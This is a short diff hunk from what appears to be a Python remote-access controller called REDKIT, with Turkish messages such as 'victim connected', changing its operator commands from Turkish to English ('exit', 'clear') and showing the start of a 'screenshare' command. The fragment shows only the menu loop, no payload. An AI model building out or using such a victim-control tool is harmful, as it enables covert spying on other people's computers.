@@ -14,12 +14,12 @@ print(f"Kurban bağlandı ({conn,addr})")
 
 while True:
     emir=input(Fore.RED+"REDKIT> "+Fore.RESET)
-    if emir == "çık":
+    if emir == "exit":
         print("Çıkış yapıldı")
         sys.exit()
         
-    elif emir == "temizle":
-        os.system("cls")
+    elif emir == "clear":
+        os.system("clear")
         continue
     
     elif emir == "screenshare":
